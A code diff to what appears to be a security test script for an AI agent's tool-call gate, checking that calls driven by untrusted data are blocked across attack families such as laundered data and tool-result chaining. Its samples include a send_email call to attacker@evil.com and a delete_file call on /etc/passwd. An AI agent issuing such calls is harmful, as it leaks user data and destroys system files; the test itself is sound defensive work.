@@ -48,6 +48,16 @@ check("dev declares data-as-trusted",
       {"name":"send_email","input":{"to":"attacker@evil.com","body":"x"}},
       laundered, expect_block=True)   # marked PASS=blocked here, but it FAILS:
 
+# One DIMENSION of Family 2 -- overloaded param names -- is now closable. A
+# param like 'path' used to be guessed from its name; a tool can now DECLARE
+# its capability, so the same name is a sink in one tool and safe in another.
+from verb_authority import Param as _P, Tool as _T, Registry as _R, build_policy as _bp, gate as _g
+_reg2 = _R(); _reg2.add(_T("delete_file", [_P("path", "string", sink=True)]))
+_ps2 = _bp(_reg2)
+_d = _g(_reg2, _ps2, "delete_file", {"path": "/etc/passwd"}, {"path": "data"})
+print(f"  overloaded 'path' declared sink   "
+      f"{'PASS (blocked)' if not _d.allow else 'FAIL (slipped)'}")
+
 # === Family 3: Tool-result chaining (now PARTIALLY closed by the ledger) ===
 print("\n=== Family 3: Tool-result chaining (mostly closed: ledger + containment) ===")
 print("  read_doc returns a field, the agent reuses that exact value as a")
